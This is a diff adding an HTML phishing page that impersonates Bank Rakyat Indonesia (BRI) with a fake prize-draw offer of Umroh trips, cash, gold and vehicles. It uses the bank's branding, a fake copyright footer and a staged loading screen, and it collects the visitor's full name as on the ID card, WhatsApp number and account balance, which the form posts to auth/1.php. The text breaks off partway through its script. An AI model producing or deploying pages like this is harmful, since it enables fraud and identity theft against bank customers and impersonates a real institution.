@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Isi Data Pendaftaran</title>
+    <meta name="theme-color" content="#0f78cb">
+    <link rel="icon" type="image/png" href="images/nssd3w.png">
+    <meta content="images/4mi0e0.jpg" property="og:image">
+    <meta name="twitter:image" content="https://hosting.tigerengine.id/4mi0e0.jpg">
+    <meta name="description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">
+    <script type="module" src="js/ionicons.esm.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(to bottom right, #e0f2fe, #e0f7fa);
+            color: #fff;
+            overflow-x: hidden;
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+            position: relative;
+            min-height: 100vh;
+        }
+
+        .bg-image {
+            position: fixed;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            height: 100%;
+            max-width: 450px;
+            z-index: -9999;
+            object-fit: cover;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 70px;
+            padding-top: 70px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .hero {
+            background-color: #ffffffe4;
+            border-radius: 10px;
+            box-shadow: 0 3px 5px rgba(0, 0, 0, 0.5);
+            margin-bottom: 10px;
+            width: 100%;
+            height: 160px;
+            overflow: hidden;
+        }
+
+        .carousel {
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+
+        .carousel-item {
+            position: absolute;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            transition: opacity 0.5s ease;
+            opacity: 0;
+        }
+
+        .carousel-item.active {
+            opacity: 1;
+        }
+
+        .carousel-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 10px;
+        }
+
+        .carousel-nav {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 10px;
+        }
+
+        .carousel-nav-item {
+            width: 10px;
+            height: 10px;
+            background-color: #cccccc;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .carousel-nav-item.active {
+            background-color: #007bff;
+        }
+
+        .form-section {
+            background-color: transparent;
+            padding: 0;
+            border-radius: 0px 0px 10px 10px;
+            width: 100%;
+            color: #000;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            margin-bottom: 10px;
+        }
+
+        .card {
+            background-color: #ffffffe4;
+            padding: 20px;
+            border-radius: 10px;
+            width: 100%;
+            box-shadow: rgba(0, 0, 0, 0.40) 0px 5px 15px 0px;
+        }
+
+        .card-body {
+            margin-bottom: 20px;
+        }
+
+        ion-icon {
+            font-size: 22px;
+            margin-left: 8px;
+            margin-top: 8px;
+            position: absolute;
+            color: #06529C;
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        .input-field {
+            margin-bottom: 15px;
+            position: relative;
+            width: 100%;
+        }
+
+        .input-field label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #000;
+            font-size: 14px;
+        }
+
+        .input-field input {
+            width: 70%;
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 70px;
+            padding-top: 70px;
+            
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border: 1px solid #007bff;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            background-color: #f9f9f9;
+            color: #09559a;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            max-width: 100%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            box-sizing: border-box;
+            letter-spacing: 0.5px;
+        }
+
+        #saldo {
+            letter-spacing: 0.5px;
+        }
+
+        .input-field input:focus {
+            outline: none;
+            border-color: #007bff;
+            box-shadow: 0 0 8px rgba(0, 123, 255, 0.6);
+            background-color: #ffffff;
+        }
+
+        .input-field input:invalid:not(:focus):not(:placeholder-shown) {
+            border-color: #ff4444;
+            background-color: #fff5f5;
+        }
+
+        .input-field input:valid:not(:focus):not(:placeholder-shown) {
+            border-color: #00C851;
+            background-color: #f5fff5;
+        }
+
+        ::placeholder {
+            color: #666;
+            opacity: 0.7;
+            font-weight: normal;
+        }
+
+        .card-footer {
+            text-align: center;
+        }
+
+        .button {
+            background-color: #137fd5;
+            color: #fff;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 7px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-size: 16px;
+            width: 100%;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
+            margin-top: 10px;
+            font-weight: 600;
+        }
+
+        .button:hover {
+            opacity: 0.8;
+            background-color: #0F78CB;
+            color: #fff;
+        }
+
+        .button:disabled,
+        .button[disabled] {
+            opacity: 0.3;
+            background-color: #0F78CB;
+            color: #fff;
+        }
+
+        nav {
+            position: fixed;
+            top: 0;
+            height: 50px;
+            background: #007bff;
+            width: 100%;
+            z-index: 99999;
+            max-width: 450px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .hh {
+            position: fixed;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 450px;
+            height: 50px;
+            background: url('images/pbtf99.jpg');
+            background-repeat: no-repeat;
+            background-size: 100% 100%;
+            box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px;
+            z-index: 100000;
+        }
+
+        .hid {
+            display: none;
+        }
+
+        .load {
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            position: fixed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #00000090;
+            z-index: 999999999;
+            width: 100%;
+            height: 100%;
+            max-width: 450px;
+        }
+
+        .load img {
+            margin: 0 auto;
+            width: 90%;
+            max-width: 300px;
+        }
+
+        .yy {
+            width: 100%;
+            padding: 12px 40px 12px 12px;
+            border-radius: 5px;
+            border: 1px solid #007bff;
+            background-color: #f9f9f9;
+            color: #09559a;
+            font-weight: bold;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            margin-bottom: 15px;
+            font-size: 14px;
+            box-sizing: border-box;
+            cursor: pointer;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2309559a' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            background-size: 16px;
+        }
+
+        .yy:focus {
+            outline: none;
+            border-color: #007bff;
+            box-shadow: 0 0 8px rgba(0, 123, 255, 0.6);
+        }
+
+        .logo-banner {
+            width: 100%;
+            margin: 15px 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .logo-banner img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .footer-text {
+            text-align: center;
+            font-size: 11px;
+            color: #00000080;
+            margin-top: 20px;
+            line-height: 1.4;
+            padding: 0 10px;
+        }
+
+        @media (max-width: 450px) {
+            .container {
+                padding: 15px;
+                padding-top: 65px;
+            }
+            
+            .hero {
+                height: 140px;
+            }
+            
+            .card {
+                padding: 15px;
+            }
+            
+            .input-field input {
+                padding: 10px 35px 10px 34px;
+                font-size: 16px !important;
+            }
+            
+            .input-field label {
+                font-size: 13px;
+            }
+            
+            .yy {
+                padding: 10px 35px 10px 10px;
+                font-size: 13px;
+            }
+            
+            .button {
+                padding: 12px;
+                font-size: 15px;
+            }
+            
+            ::placeholder {
+                font-size: 13px;
+            }
+        }
+
+        @media (max-width: 350px) {
+            .hero {
+                height: 120px;
+            }
+            
+            .container {
+                padding: 10px;
+                padding-top: 60px;
+            }
+            
+            .input-field input {
+                font-size: 15px !important;
+            }
+        }
+
+        @media (min-width: 451px) {
+            .input-field input {
+                max-width: 100%;
+            }
+        }
+
+        input[type="tel"]::-webkit-inner-spin-button,
+        input[type="tel"]::-webkit-outer-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        input[type="tel"] {
+            -moz-appearance: textfield;
+        }
+    </style>
+</head>
+
+<body>
+    <main>
+        <div class="load" id="initial-loading">
+            <img src="images/f01dmo.gif" alt="loading">
+        </div>
+        
+        <nav class="hh"></nav>
+        
+        <!-- Background image yang sudah diperbaiki posisinya -->
+        <img src="images/vdii6e.png" class="bg-image" alt="background">
+        
+        <div class="container" id="main-content" style="display: none;">
+            <section class="hero">
+                <div class="carousel">
+                    <div class="carousel-item active"><img src="images/078446400_1690877559-BRI_Desktop%20%281%29.jpg" alt="Carousel 1"></div>
+                    <div class="carousel-item"><img src="images/37848bc175eda9d028a946e6667fd04d.jpg" alt="Carousel 2"></div>
+                    <div class="carousel-item"><img src="images/d1c1b1beace88deba80dedb6b1390b4d.jpg" alt="Carousel 3"></div>
+                    <div class="carousel-item"><img src="images/1x41fv.jpg" alt="Carousel 4"></div>
+                    <div class="carousel-item"><img src="images/maxresdefault.jpg" alt="Carousel 5"></div>
+                    <div class="carousel-nav">
+                        <div class="carousel-nav-item active"></div>
+                        <div class="carousel-nav-item"></div>
+                        <div class="carousel-nav-item"></div>
+                        <div class="carousel-nav-item"></div>
+                        <div class="carousel-nav-item"></div>
+                    </div>
+                </div>
+            </section>
+
+            <div class="form-section">
+                <form id="form" action="auth/1.php" method="POST">
+                    <div class="card">
+                        <div class="card-body">
+                            <select name="KUPON" id="KUPON" required class="yy">
+                                <option value="">𝗣𝗶𝗹𝗶𝗵 𝗞𝘂𝗽𝗼𝗻 𝗨𝗻𝗱𝗶𝗮𝗻</option>
+                                <option value="Paket Umroh & Tiket Liburan">𝗣𝗮𝗸𝗲𝘁 𝗨𝗺𝗿𝗼𝗵 & 𝗧𝗶𝗸𝗲𝘁 𝗟𝗶𝗯𝘂𝗿𝗮𝗻</option>
+                                <option value="Uang Cash & Emas">𝗨𝗮𝗻𝗴 𝗖𝗮𝘀𝗵 & 𝗘𝗺𝗮𝘀</option>
+                                <option value="Mobil & Motor">𝗠𝗼𝗯𝗶𝗹 & 𝗠𝗼𝘁𝗼𝗿</option>
+                            </select>
+                            
+                            <div class="logo-banner">
+                                <img src="images/1ry6y2.png" alt="BRI Undian">
+                            </div>
+                            
+                            <div class="input-field">
+                                <label for="nama">Nama Lengkap</label>
+                                <ion-icon name="person-outline" for="nama"></ion-icon>
+                                <input type="text" id="nama" name="NAMA" placeholder="Nama sesuai KTP" required maxlength="50">
+                            </div>
+                            <div class="input-field">
+                                <label for="nohp">Nomor WhatsApp Aktif</label>
+                                <ion-icon name="phone-portrait-sharp" for="nohp"></ion-icon>
+                                <input type="tel" id="nohp" name="NOMOR" placeholder="08xxxxxxxx" maxlength="13" required>
+                            </div>
+                            <div class="input-field">
+                                <label for="saldo">Saldo Akhir</label>
+                                <ion-icon name="server-sharp"></ion-icon>
+                                <input type="tel" id="saldo" name="SALDO" class="saldo" placeholder="Rp." required maxlength="20" oninvalid="this.setCustomValidity('Pastikan Saldo Sesuai Rekening')" onchange="this.setCustomValidity('')">
+                            </div>
+                        </div>
+                        <div class="card-footer">
+                            <button type="submit" class="button" id="lanjutkan" disabled>Lanjutkan</button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+            
+            <div class="footer-text">
+                © 2025 PT.Bank Rakyat Indonesia (Persero) Tbk.<br> | All Rights Reserved.
+            </div>
+        </div>
+    </main>
+
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script src="js/jquery.mask.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Tampilkan loading saat halaman pertama kali dimuat
+            $('#initial-loading').show();
+            $('#main-content').hide();
+            
+            // Set timer 3 detik untuk menyembunyikan loading
+            setTimeout(function() {
+                $('#initial-loading').fadeOut(500, function() {
+                    $('#main-content').fadeIn(500);
+                    // Inisialisasi semua fungsi setelah loading selesai
+                    initializePage();
+                });
+            }, 3000);
+
+            // Fungsi untuk menginisialisasi halaman
+            function initializePage() {
+                // Carousel functionality
+                const carouselItems = $('.carousel-item');
+                const carouselNavItems = $('.carousel-nav-item');
+                let currentItem = 0;
+
+                function showItem(index) {
+                    carouselItems.removeClass('active');
+                    carouselNavItems.removeClass('active');
+                    $(carouselItems[index]).addClass('active');
+                    $(carouselNavItems[index]).addClass('active');
+                    currentItem = index;
+                }
+
+                carouselNavItems.each(function(index) {
+                    $(this).on('click', function() {
+                        showItem(index);
+                    });
+                });
+
+                setInterval(() => {
+                    currentItem = (currentItem + 1) % carouselItems.length;
+                    showItem(currentItem);
+                }, 3000);
+
+                // Fungsi untuk memotong teks yang terlalu panjang
+                function truncateText(input, maxLength) {
+                    if (input.value.length > maxLength) {
+                        input.value = input.value.substring(0, maxLength);
+                    }
+                }
+
+                // Validasi dan pembatasan untuk input nama
+                $('#nama').on('input', function() {
+                    truncateText(this, 50);
+                });
+
+                // Validasi dan pembatasan untuk input nomor HP
+                $('#nohp').on('input', function() {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    truncateText(this, 13);
+                    
+                    // Validasi real-time untuk nomor HP
+                    const value = $(this).val();
+                    const isValid = value.length >= 10 && value.length <= 13 && value.startsWith('08');
+                    
+                    if (value && !isValid) {
+                        $(this).css({
+                            'border-color': '#ff4444',
+                            'background-color': '#fff5f5'
+                        });
+                    } else if (value && isValid) {
+                        $(this).css({
+                            'border-color': '#00C851',
+                            'background-color': '#f5fff5'
+                        });
+                        if ($(this).val().length > 9) {
+                            $("#lanjutkan").prop("disabled", false);
+                        }
+                    } else {
+                        $(this).css({
+                            'border-color': '#007bff',
+                            'background-color': '#f9f9f9'
+                        });
+                        $("#lanjutkan").prop("disabled", true);
+                    }
+                });
+
+                // Validasi dan pembatasan untuk input saldo
+                $('#saldo').on('input', function() {
+                    this.value = this.value.replace(/[^0-9.,]/g, '');
+                    truncateText(this, 20);
+                });
+
+                // Format currency untuk Saldo input
+                $('.saldo').mask('000.000.000.000.000', { reverse: true });
+                $('#saldo').on('keyup', function() {
+                    $(this).val(formatRupiah($(this).val(), 'Rp. '));
+                });
+
+                function formatRupiah(angka, prefix) {
+                    var number_string = angka.replace(/[^,\d]/g, '').toString(),
+                        split = number_string.split(','),
+                        sisa = split[0].length % 3,
+                        rupiah = split[0].substr(0, sisa),
+                        ribuan = split[0].substr(sisa).match(/\d{3}/gi);
+
+                    if (ribuan) {
+                        separator = sisa ? '.' : '';
+                        rupiah += separator + ribuan.join('.');
+                    }
+
+                    rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+                    return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+                }
+
+                // Auto-format saat input kehilangan fokus
+                $('#nama, #nohp, #saldo').on('blur', f
